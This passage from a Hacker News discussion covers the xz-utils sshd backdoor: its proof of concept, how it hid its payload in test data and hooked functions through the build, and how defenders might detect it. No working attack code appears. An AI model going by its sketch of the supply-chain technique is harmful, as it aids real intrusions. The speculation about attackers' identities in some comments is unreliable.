months ago](item?id=39902112)   | [root](#39896221) | [parent](#39898073) | [prev](#39900571) | [next](#39900883) [–]  The whole point of asymmetric-key is that a middleman can't do that. Even if you relayed the entire handshake, all traffic after that is just line noise to you unless you have the transmitter's private key. You can't read it or mangle it (well, you can mangle it, but the receiving party will know it was mangled in transit). The exploit string on the wire for that transmission won't work in the context of any other transmission sequence. | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39902128)   | [root](#39896221) | [parent](#39902112) | [next](#39900883) [–]  Yeah I had mistakenly thought the exploit string was transmitted during key exchange (read too quickly on "pre-auth"), which is incorrect; see sibling comment. I'm unfortunately past the edit window now. | | --- | --- | --- | | | |  |  | [amluto](user?id=amluto) [9 months ago](item?id=39900883)   | [root](#39896221) | [parent](#39898073) | [prev](#39902112) | [next](#39902404) [–]  I suppose the original attacker could give really fancy exploit strings that verify the eventual payload strongly enough to prevent someone replaying the attack from accomplishing much. | | --- | --- | --- | | | |  |  | [Taniwha](user?id=Taniwha) [9 months ago](item?id=39902404)   | [parent](#39896221) | [prev](#39896420) | [next](#39902996) [–]  I wonder if anyone has packet logs from the past few weeks that show attempts at sshd - might be some incriminating IP addresses to start hunting with | | --- | --- | --- | | | |  |  | [bayindirh](user?id=bayindirh) [9 months ago](item?id=39902996)   | [parent](#39896221) | [prev](#39902404) | [next](#39901527) [–]  It's a (failed) case study in "what if we backdoor it in a way only good guys can use but bad guys can't?" Computers don't know who's / what's good or bad. They're deterministic machines which responds to commands. I don't know whether there'll be any clues about who did this, but this will be the poster child of "you can't have backdoors and security in a single system" argument (which I strongly support). | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39901527)   | [parent](#39896221) | [prev](#39902996) | [next](#39897212) [–]  IMHO it's not that surprising; asymmetric crypto has been common in ransomware for a long time, and of course ransomware in general is based on securing data from its owner. "It's not only the good guys who have guns." | | --- | --- | --- | | | |  |  | [nialv7](user?id=nialv7) [9 months ago](item?id=39897212)   | [parent](#39896221) | [prev](#39901527) | [next](#39902895) [–]  how are you going to sell it if anyone can get in? | | --- | --- | --- | | | |  |  | [ryanmerket](user?id=ryanmerket) [9 months ago](item?id=39900760)   | [root](#39896221) | [parent](#39897212) | [next](#39902895) [–]  this is probably the right answer. hacking group getting a 0day to sell to nation states on a per-use agreement. | | --- | --- | --- | | | |  |  | [whirlwin](user?id=whirlwin) [9 months ago](item?id=39902895)   | [parent](#39896221) | [prev](#39897212) | [next](#39902555) [–]  Imagine how much the private key is worth on the black market | | --- | --- | --- | | | |  |  | [bilekas](user?id=bilekas) [9 months ago](item?id=39902555)   | [prev](#39896221) | [next](#39895799) [–]  This whole thing has been consuming me over the whole weekend. The mechanisms are interesting and a collection of great obfuscations, the social engineering is a story that’s shamefully all too familiar for open source maintainers. I find most interesting how they chose their attack vector of using BAD test data, it makes the rest of the steps incredibly easier when you have a good archive, manipulate it in a structured method (this should show on a graph of the binary pattern btw for future reference) then use it for a fuzzy bad data test. It’s great. The rest of the techniques are banal enough except the most brilliant move seems to be that they could add “patches” or even whole new back doors using the same pattern on a different test file. Without being noticed. Really really interesting, GitHub shouldn’t have hidden and removed the repo though. It’s not helpful at all to work through this whole drama. Edit: I don’t mean to say this is banal in any way, but once the payload was decided and achieved through a super clever idea, the rest was just great obfuscation. | | --- | --- | --- | | | |  |  | [withinboredom](user?id=withinboredom) [9 months ago](item?id=39902916)   | [parent](#39902555) | [next](#39902590) [–]  It’s got me suspicious of build-time dependency we have in an open source tool, where the dependency goes out of its way to prefer xz and we even discovered that it installs xz on the host machine if it isn’t already installed — as a convenience. Kinda weird because it didn’t do that for any other dependencies. These long-games are kinda scary and until whatever “evil” is actually done you have no idea what is actually malicious or just weird. | | --- | --- | --- | | | |  |  | [ToneWashed](user?id=ToneWashed) [9 months ago](item?id=39903225)   | [root](#39902555) | [parent](#39902916) | [next](#39902590) [–]  > It’s got me suspicious of build-time dependency we have in an open source tool, where the dependency goes out of its way to prefer xz and we even discovered that it installs xz on the host machine if it isn’t already installed — as a convenience. Kinda weird because it didn’t do that for any other dependencies. Have you considered reaching out to the maintainers of that project and (politely) asking them to explain? In lieu of recent events I don't think anyone would blame you, in fact you might even suggest they explain such an oddly specific side effect in a README or such. | | --- | --- | --- | | | |  |  | [withinboredom](user?id=withinboredom) [9 months ago](item?id=39903251)   | [root](#39902555) | [parent](#39903225) | [next](#39902590) [–]  > Have you considered reaching out to the maintainers of that project and (politely) asking them to explain? That's kind of a catch-22, right? They'd explain with a seemingly good answer if they did it for actual reasons. They'll still explain with a seemingly good answer if they did it for nefarious reasons. I don't have a good answer to this except to monitor this dependency and its changes. | | --- | --- | --- | | | |  |  | [ToneWashed](user?id=ToneWashed) [9 months ago](item?id=39909291)   | [root](#39902555) | [parent](#39903251) | [next](#39904146) [–]  I'm not sure it's a catch-22, there are many possibilities and subsequent outcomes. I would just want to satiate my curiosity. You assume they'll have a good reason, but they may not. They could be a malicious actor but also suck at it, and you might spook them into reconsidering. Or they may be fully innocent and just suck at packaging and distributing software and you might help them learn something. If they do have a good reason, it should stand on its own merits when presented. Anyone could be up to no good and they might be plotting the end of the world, but they also might coincidentally and not relatedly happen to like xz-utils a lot. | | --- | --- | --- | | | |  |  | [wholinator2](user?id=wholinator2) [9 months ago](item?id=39904146)   | [root](#39902555) | [parent](#39903251) | [prev](#39909291) | [next](#39905041) [–]  Is it possible that it was added by a bad actor, and that most of the individuals in contact will not have signed off on it? I mean, this whole thing started by an interested party digging deeper than anyone else had, you could trigger that for someone else. At the very least, what do you have to lose? If the best they can do is look like they're fine, then every possible side effect is to root up a frighteningly well hidden inflator | | --- | --- | --- | | | |  |  | [NarcissistDev](user?id=NarcissistDev) [9 months ago](item?id=39905041)   | [root](#39902555) | [parent](#39903251) | [prev](#39904146) | [next](#39902590) [–]  They’d definitely have a great answer up their sleeves. The crazy thing is the devs responsible for the XZ backdoor are among us and will likely be here on HN, downvoting comments which are getting close to the truth and upvoting each other. The bad people are definitely here. | | --- | --- | --- | | | |  |  | [mondrian](user?id=mondrian) [9 months ago](item?id=39902590)   | [parent](#39902555) | [prev](#39902916) | [next](#39903794) [–]  A main culprit seems to be the addition of binary files to the repo, to be used as test inputs. Especially if these files are “binary garbage” to prove a test fails. Seems like an obvious place to hide malicious stuff. | | --- | --- | --- | | | |  |  | [bilekas](user?id=bilekas) [9 months ago](item?id=39902634)   | [root](#39902555) | [parent](#39902590) | [next](#39903794) [–]  It is an obvious place for sure, but it also would have been picked up if the builds where a bit more transperant. That batch build script should have been questioned before approval. | | --- | --- | --- | | | |  |  | [j16sdiz](user?id=j16sdiz) [9 months ago](item?id=39903094)   | [root](#39902555) | [parent](#39902634) | [next](#39903794) [–]  By whom? The attacker have assumed the maintainer role. Nobody is reviewing. | | --- | --- | --- | | | |  |  | [NarcissistDev](user?id=NarcissistDev) [9 months ago](item?id=39905095)   | [root](#39902555) | [parent](#39903094) | [next](#39903794) [–]  There’s a severe and dangerous lack of paranoia in this dev space. If I was letting someone maintain my codebase, I would 1 Billion percent be reviewing everything… if there was a binary added, I’d be building it myself and comparing the checksums. Trust absolutely no-one. If you can give a close friend or a loved one a loan of money and it is so easy for them to never pay you back, it should be a reminder that devs you’ve never met are even more likely to scam you. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39979377)   | [root](#39902555) | [parent](#39905095) | [next](#39915348) [–]  I think it's pretty pointless to speculate what you would have done considering the only reason "Jia Tan" was able to gain the access he did was because the original maintainer was burned out / busy with life / otherwise not able to dedicate the time needed for the project. If he can't maintain it himself he will be even less likely to adequately review his replacement. You can claim to have perfect opsec as much as you want but life has a way of screwing that up that no one is invulnerable against. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915348)   | [root](#39902555) | [parent](#39905095) | [prev](#39979377) | [next](#39905988) [–]  What's the point of having someone maintain your codebase if you have to do even more work than if you just did everything yourself? | | --- | --- | --- | | | |  |  | [waihtis](user?id=waihtis) [9 months ago](item?id=39905988)   | [root](#39902555) | [parent](#39905095) | [prev](#39915348) | [next](#39903794) [–]  pretty unhealthy attitude to live by tbh. almost better being burned by a malicious payload once every 10 years than live in perpetual fear of being constantly scammed | | --- | --- | --- | | | |  |  | [daymanstep](user?id=daymanstep) [9 months ago](item?id=39906457)   | [root](#39902555) | [parent](#39905988) | [next](#39903794) [–]  I think that depends on the context. If you're maintaining one of the most widely used packages that is directly linked to by libsystemd and is included by pretty much every Linux distro as part of the base system? Then maybe some measure of paranoia is justified. I think the OpenBSD developers are right to be as paranoid as they are. Anyone who is maintaining a security critical system should be on guard against these kinds of attacks. | | --- | --- | --- | | | |  |  | [racingmars](user?id=racingmars) [9 months ago](item?id=39911474)   | [root](#39902555) | [parent](#39906457) | [next](#39906562) [–]  > If you're maintaining one of the most widely used packages that is directly linked to by libsystemd and is included by pretty much every Linux distro as part of the base system? Then maybe some measure of paranoia is justified. But whose problem is that? systemd chose to link against liblzma, not the other way around. I doubt the xz maintainer(s) make money off of the project, and I'm assuming it's a spare-time/side-project type thing. Why should the fact that the library is included in every distro and is a dependency of systemd affect the xz maintainers' obligations? The leader of systemd has been variously employed by RedHat and Microsoft... if they're choosing to pull in an external dependency for systemd and then making money off of selling their Linux distros/cloud services, it would seem they're the ones that could afford to take on the burden of reviewing everything with a fine-toothed comb, not the xz maintaners. | | --- | --- | --- | | | |  |  | [NarcissistDev](user?id=NarcissistDev) [9 months ago](item?id=39912217)   | [root](#39902555) | [parent](#39911474) | [next](#39906562) [–]  I like your thinking. Absolutely. And very true. Even the folk who put the backdoor in will be getting paid. Everybody making bank, except Lasse. | | --- | --- | --- | | | |  |  | [waihtis](user?id=waihtis) [9 months ago](item?id=39906562)   | [root](#39902555) | [parent](#39906457) | [prev](#39911474) | [next](#39903794) [–]  Oh absolutely true for things like OpenBSD and such | | --- | --- | --- | | | |  |  | [NarcissistDev](user?id=NarcissistDev) [9 months ago](item?id=39912274)   | [root](#39902555) | [parent](#39906562) | [next](#39903794) [–]  Thing is, sec should be taken seriously across the board. I love what OpenBSD devs did - they seen an entire community of naive coders who didn’t give much of a crap about security and started something. I have used OpenBSD for 10 years and thoroughly recommend it to anyone to give you a good slap around the face for how shit is done right. | | --- | --- | --- | | | |  |  | [waihtis](user?id=waihtis) [9 months ago](item?id=39914404)   | [root](#39902555) | [parent](#39912274) | [next](#39903794) [–]  I sort of agree, I think we should collectively raise the level of paranoia slight, by some tens of percentages, to remove a lot of negative outcomes - but I wouldn't expect off-hand hobby devs to even remotely apply the same level of risk management as OpenBSD does. | | --- | --- | --- | | | |  |  | [throw156754228](user?id=throw156754228) [9 months ago](item?id=39903794)   | [parent](#39902555) | [prev](#39902590) | [next](#39895799) [–]  They removed the repo so only the attackers had access to the code and know how. | | --- | --- | --- | | | |  |  | [andybak](user?id=andybak) [9 months ago](item?id=39903968)   | [root](#39902555) | [parent](#39903794) | [next](#39895799) [–]  No. They *obviously* didn't do that so you're just being sarcastic but not actually making any point of your own in addition to that. | | --- | --- | --- | | | |  |  | [throw156754228](user?id=throw156754228) [9 months ago](item?id=39904790)   | [root](#39902555) | [parent](#39903968) | [next](#39895799) [–]  Intended levity, gee you sound miserable. Try some exercise in the mornings? | | --- | --- | --- | | | |  |  | [andybak](user?id=andybak) [9 months ago](item?id=39905442)   | [root](#39902555) | [parent](#39904790) | [next](#39895799) [–]  Read the room... This ain't Reddit. | | --- | --- | --- | | | |  |  | [throw156754228](user?id=throw156754228) [9 months ago](item?id=39906049)   | [root](#39902555) | [parent](#39905442) | [next](#39895799) [–]  Well this very reply you made is very much like something I would see on Reddit. | | --- | --- | --- | | | |  |  | [byteknight](user?id=byteknight) [9 months ago](item?id=39906307)   | [root](#39902555) | [parent](#39906049) | [next](#39895799) [–]  The door is that way, kind sir. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39895799)   | [prev](#39902555) | [next](#39895984) [–]  Super impressed how quickly the community and in particular amlweems were able to implement and document a POC. If the cryptographic or payload loading functionality has no further vulnerabilities, this would have been also at least not introducing a security flaw to all the other attackers until the key is broken or something. Edit: I think what's next for anyone is to figure out a way to probe for vulnerable deployments (which seems non-trivial) and also perhaps possibly ?upstreaming? a way to monitor if someone actively probes ssh servers with the hardcoded key. Kudos! | | --- | --- | --- | | | |  |  | [rst](user?id=rst) [9 months ago](item?id=39895840)   | [parent](#39895799) | [next](#39896033) [–]  Well, it's a POC against a re-keyed version of the exploit; a POC against the original version would require the attacker's private key, which is undisclosed. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39895867)   | [root](#39895799) | [parent](#39895840) | [next](#39899979) [–]  It's a POC nevertheless, it's a complete implementation of the RCE minus obviously the private key. | | --- | --- | --- | | | |  |  | [nindalf](user?id=nindalf) [9 months ago](item?id=39895992)   | [root](#39895799) | [parent](#39895867) | [next](#39899979) [–]  It doesn't matter. The people with the private key already knew all of this because they implemented it. The script kiddies without the private key can't do anything without it. A POC doesn't help them in any way. A way to check if servers are vulnerable is probably by querying the package manager for the installed version of xz. Not very sophisticated, but it'll work. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39896276)   | [root](#39895799) | [parent](#39895992) | [next](#39896488) [–]  > It doesn't matter. To understand the exact behavior and extend of the backdoor, this does matter. An end to end proof of how it works is exactly what was needed. > A way to check if servers are vulnerable is probably by querying the package manager Yes, this has been know since the initial report + later discovering what exact strings are present for the payload. [https://github.com/Neo23x0/signature-base/blob/master/yara/b...](https://github.com/Neo23x0/signature-base/blob/master/yara/bkdr_xz_util_cve_2024_3094.yar) > Not very sophisticated, but it'll work. Unfortunately, we live in a world with closed-servers and appliances - being able as a customer or pen tester rule out certain class of security issues without having the source/insights available is usually desirable. | | --- | --- | --- | | | |  |  | [nindalf](user?id=nindalf) [9 months ago](item?id=39896643)   | [root](#39895799) | [parent](#39896276) | [next](#39896488) [–]  > we live in a world with closed-servers and appliances Yeah but these servers and appliances aren't running Debian unstable are they? I'd understand if it affected LTS versions of distros, but these were people living on the bleeding edge anyway. Folks managing such servers are going to be fine running `apt-get update`. We got lucky with this one, tbh. | | --- | --- | --- | | | |  |  | [doakes](user?id=doakes) [9 months ago](item?id=39896488)   | [root](#39895799) | [parent](#39895992) | [prev](#39896276) | [next](#39899979) [–]  Are you saying POCs are pointless unless a script kiddie can use it? | | --- | --- | --- | | | |  |  | [nindalf](user?id=nindalf) [9 months ago](item?id=39896691)   | [root](#39895799) | [parent](#39896488) | [next](#39899979) [–]  The *context* of the conversation, which you seem to have missed, is that now that we have a POC, we need a way to check for vulnerable servers. The link being that a POC makes it easier for script kiddies to use it, meaning we're in a race against them. But we aren't, because only one group in the whole world can use this exploit. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39897177)   | [root](#39895799) | [parent](#39896691) | [next](#39899979) [–]  > is that now that we have a POC, we need a way to check for vulnerable servers. You misunderstand me, the "need to check for vulnerable servers" has nothing to do with the PoC in itself. You want to know whether you're vulnerable against this mysterious unknown attacker that went through the all the hoops for a sophisticated supply chain attack. I never said that we need a way to detect it because there is a POC out, at least I didn't meant to imply that either. > script kiddies to use it, meaning we're in a race against them This is something you and the other person were suddenly coming up with, never said this in first place. | | --- | --- | --- | | | |  |  | [misswaterfairy](user?id=misswaterfairy) [9 months ago](item?id=39899979)   | [root](#39895799) | [parent](#39895840) | [prev](#39895867) | [next](#39896033) [–]  Could the provided honeypot print out keys used in successful and unsuccessful attempts? | | --- | --- | --- | | | |  |  | [bheadmaster](user?id=bheadmaster) [9 months ago](item?id=39904712)   | [root](#39895799) | [parent](#39899979) | [next](#39896033) [–]  I don't think any (sane) client would sent its private key on login. Private key only serves as a "solver" of a puzzle created using the public key. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39896033)   | [parent](#39895799) | [prev](#39895840) | [next](#39895984) [–]  Probing for vulnerable deployments over the network (without the attacker's private key) seems impossible, not non-trivial. The best one could do is more micro-benchmarking, but for an arbitrary Internet host you aren't going to know whether it's slow because it's vulnerable, or because it's far away, or because the computer's slow in general -- you don't have access to how long connection attempts to that host took historically. (And of course, there are also routing fluctuations.) | | --- | --- | --- | | | |  |  | [anonymous-panda](user?id=anonymous-panda) [9 months ago](item?id=39899659)   | [root](#39895799) | [parent](#39896033) | [next](#39895984) [–]  Should be able to do it by having the scanner take multiple samples. As long as you don’t need a valid login and the performance issue is still observable, you should be about to scan for it with minimal cost | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39902728)   | [root](#39895799) | [parent](#39899659) | [next](#39895984) [–]  Looks like the slowdown is actually at sshd process startup time, not authentication time. So it's back to being completely impossible to network-probe for. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39895984)   | [prev](#39895799) | [next](#39896629) [–]  Has anyone tried the PoC against one of the anomalous process behavior tools? (Carbon Black, AWS GuardDuty, SysDig, etc.) I’m curious how likely it is that someone would have noticed relatively quickly had this rolled forward and this seems like a perfect test case for that product category. | | --- | --- | --- | | | |  |  | [dogman144](user?id=dogman144) [9 months ago](item?id=39898972)   | [parent](#39895984) | [next](#39896512) [–]  Depends how closely the exploit mirrors and/or masks itself within normal compression behavior imo. I don’t think GuardDuty would catch it as it doesn’t look at processes like an EDR does (CrowdStrike, Carbon black), I don’t think sysdig would catch it as looks at containers and cloud infra. Handwaving some complexity here, as GD and sysdig could prob catch something odd via privileges gained and follow-on efforts by the threat actor via this exploit. So imo means only EDRs (monitoring processes on endpoints) or software supply chain evaluations (monitoring sec problems in upstream FOSS) are most likely to catch the exploit itself. Leads into another fairly large security theme interestingly - dev teams can dislike putting EDRs on boxes bc of the hit on compute and UX issues if a containment happens, and can dislike limits policy and limits around FOSS use. So this exploit hits at the heart of a org-driven “vulnerability” that has a lot of logic to stay exposed to or to fix, depending on where you sit. Security industry’s problem set in a nutshell. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39899845)   | [root](#39895984) | [parent](#39898972) | [next](#39896512) [–]  Guard Duty does have some ptocees level monitoring with some recent additions: [https://aws.amazon.com/blogs/aws/amazon-guardduty-ec2-runtim...](https://aws.amazon.com/blogs/aws/amazon-guardduty-ec2-runtime-monitoring-is-now-generally-available/) The main thing I was thinking is that the audit hooking and especially runtime patching across modules (liblzma5 patching functions in the main sshd code block) seems like the kind of thing a generic behavioral profile could get but especially one driven by the fact that sshd does not do any of that normally. And, yes, performance and reliability issues are a big problem here. When CarbonBlack takes down production again, you probably end up with a bunch of exclusions which mean an actual attacker might be missed. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915374)   | [root](#39895984) | [parent](#39899845) | [next](#39896512) [–]  This kind of thing is quite difficult to do generally, because it is very easy to bypass, has significant performance impact, and has low reliability to boot. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39925095)   | [root](#39895984) | [parent](#39915374) | [next](#39896512) [–]  I’m not saying it’s trivial, but in this case couldn’t you basically do W^X and watch process startup for anomalous behavior? Monkey-patching other libraries’ code should be pretty uncommon. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39958673)   | [root](#39895984) | [parent](#39925095) | [next](#39896512) [–]  That's not what liblzma is doing, it's patching GOT entries which are pure data. | | --- | --- | --- | | | |  |  | [knoxa2511](user?id=knoxa2511) [9 months ago](item?id=39896512)   | [parent](#39895984) | [prev](#39898972) | [next](#39915368) [–]  Sysdig released a blog on friday. "For runtime detection, one way to go about it is to watch for the loading of the malicious library by SSHD. These shared libraries often include the version in their filename." The blog has the actual rule content which I haven't seen from other security vendors [https://sysdig.com/blog/cve-2024-3094-detecting-the-sshd-bac...](https://sysdig.com/blog/cve-2024-3094-detecting-the-sshd-backdoor-in-xz-utils/) | | --- | --- | --- | | | |  |  | [RamRodification](user?id=RamRodification) [9 months ago](item?id=39898274)   | [root](#39895984) | [parent](#39896512) | [next](#39897445) [–]  That relies on knowing what to look for. I.e. "the malicious library". The question is whether any of these solutions could catch it without knowing about it beforehand and having a detection rule specifically made for it. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39897445)   | [root](#39895984) | [parent](#39896512) | [prev](#39898274) | [next](#39915368) [–]  Thanks! That’s a little disappointing since I would have thought that the way it hooked those functions could’ve been caught by a generic heuristic but perhaps that’s more common than I thought. | | --- | --- | --- | | | |  |  | [acid\_\_](user?id=acid__) [9 months ago](item?id=39901191)   | [root](#39895984) | [parent](#39897445) | [next](#39915368) [–]  My experience from working in the security space is that all the tech is pretty un-sexy (with very good sales pitches), and none of it will save you from a nation-state attacker. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39904852)   | [root](#39895984) | [parent](#39901191) | [next](#39915368) [–]  Same. I was hoping to be wrong in my cynicism but… | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915368)   | [parent](#39895984) | [prev](#39896512) | [next](#39896629) [–]  That entire product category is for the most part snake oil. | | --- | --- | --- | | | |  |  | [faxmeyourcode](user?id=faxmeyourcode) [9 months ago](item?id=39896629)   | [prev](#39895984) | [next](#39902790) [–]  Edit: I misunderstood what I was reading in the link below, my original comment is here for posterity. :) > From down in the same mail thread: it looks like the individual who committed the backdoor has made some recent contributions to the kernel as well... Ouch. <https://www.openwall.com/lists/oss-security/2024/03/29/10> The OP is such great analysis, I love reading this kind of stuff! | | --- | --- | --- | | | |  |  | [ibotty](user?id=ibotty) [9 months ago](item?id=39897150)   | [parent](#39896629) | [next](#39897083) [–]  No that patch series is from Lasse. He said himself that it's not urgent in any way and it won't be merged this merge window, but nobody (sane) is accusing Lasse of being the bad actor. | | --- | --- | --- | | | |  |  | [davikr](user?id=davikr) [9 months ago](item?id=39897083)   | [parent](#39896629) | [prev](#39897150) | [next](#39897141) [–]  Lasse Collin is not Jia Tan until proven otherwise. | | --- | --- | --- | | | |  |  | [verytrivial](user?id=verytrivial) [9 months ago](item?id=39903872)   | [root](#39896629) | [parent](#39897083) | [next](#39901239) [–]  Speaking only hypothetically, but two points: 1) No-one has been is proven to "be" anyone in this case. Reputation is OSS is built upon behaviour only, not identity. "Jia Tan" managed to tip the scales by *also* being helpful. That identity is 99% likely to be a confection. 2) People can do terrible things when strongly encouraged or worse coerced. Including dissolving identity boundaries. The first problem can be 'solved' by using real identities and web of trust but that will NEVER fly in OSS for a multitude of technical and social reasons. The second problem will simply never be solved in any context, OSS or otherwise. Bad actors be bad, yo. | | --- | --- | --- | | | |  |  | [pavon](user?id=pavon) [9 months ago](item?id=39901239)   | [root](#39896629) | [parent](#39897083) | [prev](#39903872) | [next](#39899379) [–]  No, he likely is not. But the patch series includes commits co-developed by Jia Tan, and lists Jia Tan as a maintainer of the kernel module. | | --- | --- | --- | | | |  |  | [robocat](user?id=robocat) [9 months ago](item?id=39899379)   | [root](#39896629) | [parent](#39897083) | [prev](#39901239) | [next](#39897141) [–]  Passive aggressive accusation. This style of fake doubt is really not appropriate anywhere. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39897141)   | [parent](#39896629) | [prev](#39897083) | [next](#39900994) [–]  The referenced patch series had not made it into the kernel yet. | | --- | --- | --- | | | |  |  | [wezdog1](user?id=wezdog1) [9 months ago](item?id=39900994)   | [parent](#39896629) | [prev](#39897141) | [next](#39902790) [–]  Also it may br a coincidence but JiaT75 looks a lot like Transponder 7500 which in aviation means hijacked... | | --- | --- | --- | | | |  |  | [dxthrwy856](user?id=dxthrwy856) [9 months ago](item?id=39902790)   | [prev](#39896629) | [next](#39896915) [–]  The parallels in this one to the audacity event a couple years back are ridiculous. Cookie guy claimed that he got stabbed and that the federal police was involved in the case, which kind of hints that the events were connected to much bigger actors than just 4chan. At the time a lot of people thought its just Muse Group that's involved, but maybe it was a (Russian) state actor? Because before that he claimed that audacity had lots of telemetry/backdoors which were the reason he forked and removed in his first commits. Maybe audacity is backdoored after all? Have to check the audacity source code now. | | --- | --- | --- | | | |  |  | [cookiengineer](user?id=cookiengineer) [9 months ago](item?id=39903024)   | [parent](#39902790) | [next](#39902875) [–]  Careful, APT28 is pretty dangerous. They are merging their ops with APT29 these days, and I wouldn't wake the cozy bear if I were you. | | --- | --- | --- | | | |  |  | [dxthrwy856](user?id=dxthrwy856) [9 months ago](item?id=39913582)   | [root](#39902790) | [parent](#39903024) | [next](#39902875) [–]  So it was a state level actor that organized the doxxing campaign? | | --- | --- | --- | | | |  |  | [cookiengineer](user?id=cookiengineer) [9 months ago](item?id=39937961)   | [root](#39902790) | [parent](#39913582) | [next](#39902875) [–]  Well, I've pivoted to cyber defense for a reason. The executives are hopelessly overwhelmed with anything related to APTs. In their minds, criminals want money and if there's no money to follow, they can't do squat about it. | | --- | --- | --- | | | |  |  | [CommitSyn](user?id=CommitSyn) [9 months ago](item?id=39902875)   | [parent](#39902790) | [prev](#39903024) | [next](#39896915) [–]  Cookie guy? | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39896915)   | [prev](#39902790) | [next](#39896524) [–]  Instead of needing the honeypot openssh.patch at compile-time <https://github.com/amlweems/xzbot/blob/main/openssh.patch> How did the exploit do this at runtime? I know the chain was: opensshd -> systemd for notifications -> xz included as transient dependency How did liblzma.so.5.6.1 hook/patch all the way back to openssh\_RSA\_verify when it was loaded into memory? | | --- | --- | --- | | | |  |  | [tadfisher](user?id=tadfisher) [9 months ago](item?id=39897012)   | [parent](#39896915) | [next](#39896972) [–]  When loading liblzma, it patches the ELF GOT (global offset table) with the address of the malicious code. In case it's loaded before libcrypto, it registers a symbol audit handler (a glibc-specific feature, IIUC) to get notified when libcrypto's symbols are resolved so it can defer patching the GOT. | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39897102)   | [root](#39896915) | [parent](#39897012) | [next](#39896972) [–]  > When loading liblzma, it patches the ELF GOT (global offset table) with the address of the malicious code. How was this part obfuscated/undetected? | | --- | --- | --- | | | |  |  | [bewaretheirs](user?id=bewaretheirs) [9 months ago](item?id=39897184)   | [root](#39896915) | [parent](#39897102) | [next](#39915398) [–]  it was part of the binary malware payload hidden in a binary blob of "test data". In a compression/decompression test suite, a subtly broken allegedly compressed binary blob is not out of place. This suggests we need to audit information flow during builds - the shipping production binary package should be reproduceably buildable without reading test data or test code. | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39897276)   | [root](#39896915) | [parent](#39897184) | [next](#39915398) [–]  How/why did the test data get bundled into the final library output? | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39897676)   | [root](#39896915) | [parent](#39897276) | [next](#39897562) [–]  That’s what the compromised build stage did. It’s really interesting to read if you want to see the details of how a sophisticated attacker works: [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design) <https://gynvael.coldwind.pl/?lang=en&id=782> | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39898286)   | [root](#39896915) | [parent](#39897676) | [next](#39897562) [–]  > build-to-host.m4 I wasn't aware that the rogue maintainer was able to commit himself without any PR review (or he snuck it through PR review) rogue steps in the build process as well that went unnoticed so that he could bundle decompressed `xz` streams from test data, that also patched output .so files well enough to add hooking code to them. How many "process failures" are described in that process that exist in every OSS repo with volunteer unknown untrusted maintainers? | | --- | --- | --- | | | |  |  | [belthesar](user?id=belthesar) [9 months ago](item?id=39898765)   | [root](#39896915) | [parent](#39898286) | [next](#39900497) [–]  That's kind of the rub here. > volunteer That's the majority of OSS. Only a handful of the projects we use today as a part of the core set of systems in the OSS world actually have corporate sponsorship by virtue of maintainers/contributors on the payroll. > unknown The actor built up a positive reputation by assisting with maintaining the repo at a time when the lead dev was unable to take an active role. In this sense, although we did not have some kind of full chain of authentication that "Jia Tan" was a real human that existed, that's about as good as it gets, and there's plenty of real world examples of espionage in both the open and closed source software world that can tell us that identity verification may not have prevented anything. > untrusted The actor gained trust. The barrier to gaining trust may have been low due to the mental health of the lead maintainer, but trust was earned and received. The lead maintainer communicated to distros that they should be added. That's the rub here. It's \_really easy\_ to say this is a process problem. It's not. This was a social engineering attack first and foremost before anything else. It unlocked the way forward for the threat actor to take many actions unilaterally. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39900497)   | [root](#39896915) | [parent](#39898286) | [prev](#39898765) | [next](#39899749) [–]  The changes to build-to-host.m4 *weren't* in the source repo, so there was no commit. The attacker had permissions to create GitHub releases, so they simply added it to the GitHub release tarball. | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39905924)   | [root](#39896915) | [parent](#39900497) | [next](#39899749) [–]  How would this have made it into Debian? Part of the Debian build is to pull down a release tarball (and then build from source) and not `git clone` a repo at a specific tag and build from source? | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39899749)   | [root](#39896915) | [parent](#39898286) | [prev](#39900497) | [next](#39898934) [–]  This guy was pretty trusted after a couple of years of working on the project so I think it’s a category error to say process improvements could have fixed it. The use of autoconf detritus was a canny move since I’d bet long odds that even if your process said three other people had to review every commit they would have skimmed right over that to the ”important” changes. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39898934)   | [root](#39896915) | 